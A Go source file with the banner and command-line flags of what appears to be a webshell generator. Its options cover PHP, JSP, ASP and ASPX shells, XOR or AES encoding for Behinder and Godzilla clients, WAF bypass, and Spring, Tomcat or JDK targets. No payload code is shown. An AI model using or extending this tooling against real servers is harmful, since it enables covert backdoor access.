package common

import (
	"flag"
	"fmt"
	"os"
	"runtime"
	"runtime/debug"
	"time"
)

func init() {
	go func() {
		for {
			GC()
			time.Sleep(5 * time.Second)
		}
	}()
}

func GC() {
	runtime.GC()
	debug.FreeOSMemory()
}

func title() {
	titles = `

              _         _          _ _ 
__      _____| |__  ___| |__   ___| | |
\ \ /\ / / _ \ '_ \/ __| '_ \ / _ \ | |
 \ V  V /  __/ |_) \__ \ | | |  __/ | |
  \_/\_/ \___|_.__/|___/_| |_|\___|_|_|
		                   version  1.1
		-p password | Default password	noway
		-s php | jsp | asp | aspx
		-e xor | aes 
		-d be | god
`
	fmt.Println(titles)
}

func Flag() {
	title()
	flag.StringVar(&Webshell, "s", "", "-s php | jsp | asp | aspx")
	flag.StringVar(&Password, "p", "noway", "-p password")
	flag.BoolVar(&Help, "h", false, "help")
	flag.StringVar(&Encode, "e", "", " xor aes 128 only Behinder and Godzilla")
	flag.StringVar(&Memory, "d", "", "-d Behinder(Be) | Godzilla(God) ")
	flag.StringVar(&Bypass, "b", "", "something bypass waf | php ")
	flag.StringVar(&Lei, "l", "", "-l spring tomcat resin jdk")
	flag.Parse()
	if Help {
		flag.PrintDefaults()
		os.Exit(0)
	}
	return
}
